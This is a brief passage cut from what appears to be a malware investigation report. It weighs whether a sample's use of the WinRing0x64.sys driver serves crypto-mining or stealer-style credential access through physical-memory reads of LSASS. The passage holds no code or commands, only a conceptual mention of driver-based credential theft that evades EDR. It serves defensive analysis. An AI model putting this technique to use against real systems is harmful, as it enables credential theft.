operator's own geolocation endpoint), and tilted the WinRing0x64.sys question itself: a related sample's own report says mining, but this capture's own vendor labels say stealer, and a physical-memory read primitive is exactly the kind of EDR-blind credential-access tool a stealer would want. That fork, mining tuning versus LSASS access via a driver, not which binary happens to load the driver, is the real open question this investigation ends on.
